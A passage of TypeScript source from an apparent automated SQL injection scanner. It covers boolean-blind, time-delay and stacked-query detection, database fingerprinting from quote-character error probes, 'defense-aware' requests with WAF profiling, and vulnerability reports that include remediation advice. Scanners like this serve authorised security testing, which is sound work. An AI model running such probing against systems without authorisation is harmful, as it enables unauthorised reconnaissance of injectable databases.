      if (pageSameButDOMDifferent) {
        await this.onLog("info", `[DOM-Hash] Page size identical but DOM structure differs - investigating further...`);
      }

      // Legacy structural comparison (simple regex-based)
      const structuralResults = trueResponses.map((tr, idx) => 
        this.compareStructural(tr.body, falseResponses[idx]?.body || "")
      );
      const legacyStructurallyDifferent = structuralResults.filter(r => r.isSignificantDiff).length >= Math.ceil(MIN_CONFIRMATIONS * 0.66);
      const legacyStructuralEvidence = structuralResults.find(r => r.isSignificantDiff)?.evidence || "";

      const headersDifferent = this.compareHeaders(trueResponses[0].headers, falseResponses[0].headers);

      const statusDiff = trueResponses[0].status !== falseResponses[0].status;

      // Detection decision: prioritize DOM hash analysis for high-confidence findings
      const domDetection = domStructurallyDifferent && (domHighConfidence || pageSameButDOMDifferent);
      
      if ((trueConsistent && falseConsistent && trueAndFalseDifferent) ||
          (trueLenConsistent && falseLenConsistent && significantLengthDiff) ||
          domDetection ||
          legacyStructurallyDifferent ||
          headersDifferent ||
          statusDiff) {
        result.success = true;
        result.payload = truePayload;
        
        if (domDetection) {
          // DOM hash detection takes priority - provides most detailed evidence
          result.evidence = domEvidence || `DOM structural diff detected (${payloadSet.desc})`;
          if (pageSameButDOMDifferent) {
            result.evidence = `[High-Confidence] ${result.evidence} - page size identical but DOM structure differs`;
          }
        } else if (trueAndFalseDifferent) {
          result.evidence = `Boolean conditions produce consistent differential normalized responses (${payloadSet.desc})`;
        } else if (legacyStructurallyDifferent) {
          result.evidence = `Structural DOM difference: ${legacyStructuralEvidence} (${payloadSet.desc})`;
        } else if (significantLengthDiff) {
          result.evidence = `Body length difference: ${avgTrueLen.toFixed(0)} vs ${avgFalseLen.toFixed(0)} (${(lengthDiffRatio * 100).toFixed(1)}% diff)`;
        } else if (statusDiff) {
          result.evidence = `HTTP status difference: ${trueResponses[0].status} vs ${falseResponses[0].status}`;
        } else {
          result.evidence = `Response headers differ between true/false conditions`;
        }
        
        result.confirmations = trueResponses.length + falseResponses.length;
        
        // Live Payload View: Update with high confidence on detection
        const confidence = domDetection && pageSameButDOMDifferent ? 95 : 85;
        this.executionController?.setCurrentPayload?.(truePayload, "BOOLEAN-CONFIRMED", confidence);
        
        await this.onLog("info", `[Boolean-Blind] SUCCESS: ${result.evidence}`);
        break;
      }
    }

    return result;
  }

  private async testTimeBlindClass(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Time-Based] Testing parameter '${paramName}' with progressive delays...`);

    const result: PayloadClassResult = {
      class: "blind-time",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    const controlTimings: number[] = [];
    for (let i = 0; i < 3; i++) {
      const controlPayload = randomString(8);
      const startTime = Date.now();
      await this.makeDefenseAwareRequest(url, paramName, controlPayload, sessionCookies);
      controlTimings.push(Date.now() - startTime);
      await sleep(50);
    }
    const controlMean = controlTimings.reduce((a, b) => a + b, 0) / controlTimings.length;
    const controlVariance = controlTimings.reduce((sum, t) => sum + Math.pow(t - controlMean, 2), 0) / controlTimings.length;
    const controlStdDev = Math.sqrt(controlVariance);

    await this.onLog("info", `[Time-Based] Control baseline: mean=${controlMean.toFixed(0)}ms, stdDev=${controlStdDev.toFixed(0)}ms`);

    const dbType = context.inferredBackend !== "unknown" ? context.inferredBackend : this.detectedDbType;
    
    const baseTimePayloads = dbType !== "unknown"
      ? DB_SPECIFIC_PAYLOADS[dbType].time
      : DB_SPECIFIC_PAYLOADS.unknown.time;

    for (const basePayload of baseTimePayloads) {
      const progressiveTimings: number[][] = [];
      let allDelaysProportional = true;

      for (const delay of TIME_DELAYS) {
        const payload = basePayload.replace('{DELAY}', String(delay));
        const adaptedPayload = context.type === "numeric" ? `1${payload}` : payload;
        
        // Live Payload View: Update current payload
        this.executionController?.setCurrentPayload?.(adaptedPayload, `TIME-BASED-${delay}s`, 0);
        this.executionController?.incrementPayloadsTested?.();

        const timings: number[] = [];
        
        for (let attempt = 0; attempt < TIME_BASED_REQUIRED_SUCCESS; attempt++) {
          const startTime = Date.now();
          await this.makeDefenseAwareRequest(url, paramName, adaptedPayload, sessionCookies);
          const elapsed = Date.now() - startTime;
          timings.push(elapsed);
          await sleep(100);
        }

        progressiveTimings.push(timings);
        
        const expectedDelay = delay * 1000;
        const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
        const timingVariance = timings.reduce((sum, t) => sum + Math.pow(t - avgTiming, 2), 0) / timings.length;
        const timingStdDev = Math.sqrt(timingVariance);
        const varianceRatio = timingStdDev / avgTiming;

        if (varianceRatio > TIME_VARIANCE_THRESHOLD) {
          await this.onLog("info", `[Time-Based] High variance (${(varianceRatio * 100).toFixed(1)}%) for ${delay}s delay - rejecting`);
          allDelaysProportional = false;
          break;
        }

        if (avgTiming < expectedDelay * 0.7 || avgTiming < controlMean + (delay * 500)) {
          allDelaysProportional = false;
          break;
        }
      }

      if (!allDelaysProportional || progressiveTimings.length < TIME_DELAYS.length) continue;

      const avgTimings = progressiveTimings.map(t => t.reduce((a, b) => a + b, 0) / t.length);
      
      let proportionalIncrease = true;
      for (let i = 1; i < avgTimings.length; i++) {
        const expectedRatio = TIME_DELAYS[i] / TIME_DELAYS[i - 1];
        const actualRatio = avgTimings[i] / avgTimings[i - 1];
        
        if (actualRatio < expectedRatio * 0.5 || actualRatio > expectedRatio * 2) {
          proportionalIncrease = false;
          break;
        }
      }

      if (proportionalIncrease) {
        const successPayload = basePayload.replace('{DELAY}', String(TIME_DELAYS[0]));
        const adaptedPayload = context.type === "numeric" ? `1${successPayload}` : successPayload;
        
        result.success = true;
        result.payload = adaptedPayload;
        result.evidence = `Progressive time delays: ${avgTimings.map(t => (t/1000).toFixed(1) + 's').join(' -> ')} (expected ${TIME_DELAYS.join('s -> ')}s)`;
        result.confirmations = TIME_BASED_REQUIRED_SUCCESS * TIME_DELAYS.length;
        
        // Live Payload View: Update with high confidence on detection
        this.executionController?.setCurrentPayload?.(adaptedPayload, "TIME-CONFIRMED", 90);
        
        break;
      }
    }

    return result;
  }

  private async testTimeBlindClassLimited(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Time-Based] Limited testing for '${paramName}' (max ${MAX_TIME_BASED_ATTEMPTS} attempts)...`);

    const result: PayloadClassResult = {
      class: "blind-time",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    // Quick baseline
    const controlStart = Date.now();
    await this.makeDefenseAwareRequest(url, paramName, randomString(6), sessionCookies);
    const controlTime = Date.now() - controlStart;

    const dbType = context.inferredBackend !== "unknown" ? context.inferredBackend : this.detectedDbType;
    const timePayloads = (dbType !== "unknown" 
      ? DB_SPECIFIC_PAYLOADS[dbType].time 
      : DB_SPECIFIC_PAYLOADS.unknown.time
    ).slice(0, MAX_TIME_BASED_ATTEMPTS);

    const targetDelay = 2; // Only test 2 second delay for speed

    for (const basePayload of timePayloads) {
      if (this.checkCancellation()) break;
      
      const payload = basePayload.replace('{DELAY}', String(targetDelay));
      const adaptedPayload = context.type === "numeric" ? `1${payload}` : payload;

      const timings: number[] = [];
      for (let i = 0; i < 2; i++) {
        if (this.checkCancellation()) break;
        const start = Date.now();
        await this.makeDefenseAwareRequest(url, paramName, adaptedPayload, sessionCookies);
        timings.push(Date.now() - start);
        await sleep(50);
      }

      const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
      const expectedDelay = targetDelay * 1000;

      // Must be at least 70% of expected delay AND significantly more than control
      if (avgTiming >= expectedDelay * 0.7 && avgTiming > controlTime * 2) {
        result.success = true;
        result.payload = adaptedPayload;
        result.evidence = `Time delay: avg ${(avgTiming/1000).toFixed(1)}s (expected ${targetDelay}s, control ${(controlTime/1000).toFixed(1)}s)`;
        result.confirmations = 2;
        break;
      }
    }

    return result;
  }

  private async testStackedClass(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Stacked] Testing parameter '${paramName}'...`);

    const result: PayloadClassResult = {
      class: "stacked",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    const dbType = context.inferredBackend !== "unknown" ? context.inferredBackend : this.detectedDbType;
    const stackedPayloads = DB_SPECIFIC_PAYLOADS[dbType]?.stacked?.map(p => p.replace('{DELAY}', String(TIME_DELAYS[0]))) || [];

    for (const payload of stackedPayloads) {
      if (this.checkCancellation()) break;
      
      const timings: number[] = [];
      let allAboveThreshold = true;

      for (let attempt = 0; attempt < TIME_BASED_REQUIRED_SUCCESS; attempt++) {
        if (this.checkCancellation()) break;
        const startTime = Date.now();
        const response = await this.makeDefenseAwareRequest(url, paramName, payload, sessionCookies);
        const elapsed = Date.now() - startTime;
        
        timings.push(elapsed);

        if (elapsed < baseline.latencyBaseline.threshold) {
          allAboveThreshold = false;
          break;
        }

        await sleep(100);
      }

      if (!allAboveThreshold || timings.length < TIME_BASED_REQUIRED_SUCCESS) continue;

      const injectedMean = timings.reduce((a, b) => a + b, 0) / timings.length;
      const expectedDelay = TIME_DELAYS[0] * 1000;

      if (injectedMean >= expectedDelay * 0.7) {
        result.success = true;
        result.payload = payload;
        result.evidence = `Stacked query delay: ${(injectedMean/1000).toFixed(1)}s`;
        result.confirmations = TIME_BASED_REQUIRED_SUCCESS;
        break;
      }
    }

    return result;
  }

  private async discoverParameterContext(url: string, paramName: string, originalValue: string): Promise<ParameterContext> {
    const isHeaderParam = paramName.startsWith("header:");
    const isHiddenParam = paramName.startsWith("hidden:");
    
    const context: ParameterContext = {
      name: paramName,
      type: isHeaderParam ? "header" : isHiddenParam ? "hidden" : "string",
      inferredBackend: "unknown",
      reflectionBehavior: "ignored",
      originalValue,
      sqlPriority: isHiddenParam ? "high" : this.classifySqlPriority(paramName, originalValue),
    };

    if (!isHeaderParam && !isHiddenParam) {
      context.type = this.inferParameterType(originalValue);
    }

    if (isHeaderParam || isHiddenParam) {
      context.reflectionBehavior = "processed";
      return context;
    }

    const reflectionTest = randomString(12);
    const reflectionUrl = injectPayload(url, paramName, reflectionTest);
    const reflectionResponse = await this.request(reflectionUrl, { timeout: 5000 });
    
    if (!reflectionResponse.error) {
      if (reflectionResponse.body.includes(reflectionTest)) {
        context.reflectionBehavior = "echoed";
      } else if (reflectionResponse.body.length !== 0) {
        context.reflectionBehavior = "processed";
      }
    }

    const errorProbes = ["'", "\"", "\\", "1'", "1\""];
    for (const probe of errorProbes) {
      if (this.checkCancellation()) break;
      
      await this.trackAndPace(paramName);
      const probeUrl = injectPayload(url, paramName, originalValue + probe);
      try {
        const probeResponse = await this.request(probeUrl, { timeout: 5000 });
        
        if (!probeResponse.error) {
          const detected = this.detectDatabaseFromResponse(probeResponse.body);
          if (detected !== "unknown") {
            context.inferredBackend = detected;
            this.detectedDbType = detected;
            await this.onLog("info", `[Discovery] Database fingerprint detected: ${detected}`);
            break;
          }
        }
      } catch (error) {
        await this.onLog("warn", `[Discovery] Probe error: ${error}`).catch(() => {});
      }
      await sleep(50);
    }

    return context;
  }

  private inferParameterType(value: string): ParameterType {
    if (/^\d+$/.test(value)) return "numeric";
    if (/^\d+\.\d+$/.test(value)) return "numeric";
    
    try {
      JSON.parse(value);
      return "json";
    } catch {}

    if (value.length === 0) return "hidden";
    
    return "string";
  }

  private detectDatabaseFromResponse(body: string): DatabaseType {
    for (const [dbType, patterns] of Object.entries(DB_ERROR_PATTERNS) as [DatabaseType, RegExp[]][]) {
      if (dbType === "unknown") continue;
      for (const pattern of patterns) {
        if (pattern.test(body)) {
          return dbType;
        }
      }
    }
    return "unknown";
  }

  private async establishBaseline(url: string, paramName: string, sessionCookies?: Record<string, string>): Promise<BaselineMetrics | null> {
    const responses: RequestResult[] = [];
    const timeSamples: number[] = [];
    
    for (let i = 0; i < BASELINE_SAMPLE_COUNT; i++) {
      if (this.checkCancellation()) return null;
      
      await this.trackAndPace(paramName);
      const benignValue = randomString(5 + i);
      const benignUrl = injectPayload(url, paramName, benignValue);
      
      const headers: Record<string, string> = {};
      if (sessionCookies && Object.keys(sessionCookies).length > 0) {
        headers.Cookie = Object.entries(sessionCookies).map(([k, v]) => `${k}=${v}`).join("; ");
      }

      try {
        const response = await this.request(benignUrl, { 
          timeout: 5000,
          headers: Object.keys(headers).length > 0 ? headers : undefined,
        });
        
        if (response.error || response.status === 0) {
          if (i >= 2) break;
          return null;
        }
        
        responses.push(response);
        timeSamples.push(response.responseTime);
      } catch (error) {
        if (i >= 2) break;
        return null;
      }
      await sleep(50);
    }

    if (responses.length < 3) return null;

    const times = timeSamples;
    const mean = times.reduce((a, b) => a + b, 0) / times.length;
    
    const squaredDiffs = times.map(t => Math.pow(t - mean, 2));
    const avgSquaredDiff = squaredDiffs.reduce((a, b) => a + b, 0) / times.length;
    const stdDev = Math.sqrt(avgSquaredDiff);
    
    const threshold = mean + (3 * stdDev) + (TIME_DELAYS[0] * 1000);

    const latencyBaseline: LatencyBaseline = {
      samples: times,
      mean,
      stdDev,
      threshold,
    };

    const avgTime = mean;
    const maxTime = Math.max(...times);
    const minTime = Math.min(...times);
    
    const normalizedBody = this.normalizeResponseForDiff(responses[0].body);

    return {
      status: responses[0].status,
      size: responses[0].contentLength,
      avgTime,
      maxTime,
      minTime,
      body: responses[0].body,
      bodyHash: hashString(responses[0].body),
      normalizedBody,
      normalizedHash: hashString(normalizedBody),
      latencyBaseline,
      responses,
    };
  }

  private extractErrorPatterns(body: string): { patterns: string[]; dbType: DatabaseType } {
    const found: string[] = [];
    let detectedDb: DatabaseType = "unknown";
    
    for (const [dbType, patterns] of Object.entries(DB_ERROR_PATTERNS) as [DatabaseType, RegExp[]][]) {
      for (const pattern of patterns) {
        if (pattern.test(body)) {
          found.push(pattern.source);
          if (dbType !== "unknown") {
            detectedDb = dbType;
          }
        }
      }
    }
    
    return { patterns: found, dbType: detectedDb };
  }

  private hasSignificantNewContent(baselineBody: string, testBody: string): boolean {
    const baselineLines = new Set(baselineBody.split('\n').map(l => l.trim()).filter(l => l.length > 15));
    const testLines = testBody.split('\n').map(l => l.trim()).filter(l => l.length > 15);
    
    let newLineCount = 0;
    for (const line of testLines) {
      if (!baselineLines.has(line)) {
        newLineCount++;
      }
    }
    
    return newLineCount >= 3 || (testLines.length > 0 && newLineCount / testLines.length > 0.2);
  }

  private shouldTestStackedQueries(dbType: DatabaseType): boolean {
    return dbType === "postgresql" || dbType === "mssql";
  }

  private async reportVulnerability(result: SQLiResult, url: string): Promise<void> {
    const stabilityInfo = result.stabilityScore > 0 ? ` | Stability: ${result.stabilityScore}%` : "";
    const classesInfo = ` | Classes: ${result.payloadClassesSucceeded.length}/${result.payloadClassesAttempted.length}`;
    
    await this.onLog("warn", `[${result.confidenceLevel}] SQL Injection (${result.type}) in '${result.parameter}' | DB: ${result.dbType} | Confidence: ${result.confidence.toFixed(0)}%${stabilityInfo}${classesInfo}`);

    const severityMap: Record<string, string> = {
      "error": "Critical",
      "union": "Critical",
      "blind-time": "High",
      "blind-boolean": "High",
      "stacked": "Critical",
    };

    const wafProfile = this.defenseAwareness.getWAFProfile();
    const wafNote = wafProfile.detected ? ` WAF detected: ${wafProfile.vendor || 'Unknown'}.` : "";
    const sequenceNote = result.sequenceContext 
      ? ` Detected in workflow step: ${result.sequenceContext.stepName} (${result.sequenceContext.stepIndex + 1}).`
      : "";

    const stabilityMetadata = result.stabilityScore > 0 
      ? `\n[Stability: ${result.stabilityScore}% | Classes: ${result.payloadClassesSucceeded.join(", ")} | DB: ${result.dbType}]` 
      : "";
    const evidenceWithMetadata = `${result.evidence}${stabilityMetadata}`;
    
    await this.onVuln({
      type: `SQL Injection (${result.type})`,
      severity: severityMap[result.type] || "High",
      url,
      parameter: result.parameter,
      payload: result.payload,
      evidence: evidenceWithMetadata,
      description: this.getDescription(result.type, result.dbType),
      remediation: "Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and use an ORM or query builder. Consider using stored procedures with proper parameter binding.",
      verificationStatus: result.verificationStatus,
      confidence: Math.round(result.confidence),
      verificationDetails: `${result.verificationDetails}${wafNote}${sequenceNote} ${result.baselineComparison}. Confidence level: ${result.confidenceLevel}.`,
    });
  }

  private getDescription(type: PayloadClass, dbType: DatabaseType): string {
    const dbInfo = dbType !== "unknown" ? ` The backend appears to be ${dbType}.` : "";
    
    switch (type) {
      case "error":
        return `Error-based SQL injection was detected.${dbInfo} The application displays database errors when malicious SQL is injected, allowing attackers to extract information directly from error messages.`;
      case "union":
        return `UNION-based SQL injection was detected.${dbInfo} The application is vulnerable to UNION SELECT attacks, allowing attackers to append additional queries and extract data from other tables.`;
      case "blind-boolean":
        return `Boolean-based blind SQL injection was detected.${dbInfo} The application responds differently to true vs false SQL conditions, allowing attackers to extract data bit by bit.`;
      case "blind-time":
        return `Time-based blind SQL injection was detected.${dbInfo} The application is vulnerable to time-delay attacks, confirmed through progressive delay testing with variance analysis.`;
      case "stacked":
        return `Stacked queries SQL injection was detected.${dbInfo} The application allows multiple SQL statements to be executed in sequence, enabling more dangerous attacks including data modification.`;
      default:
        return `SQL injection vulnerability was detected.${dbInfo}`;
    }
  }
}
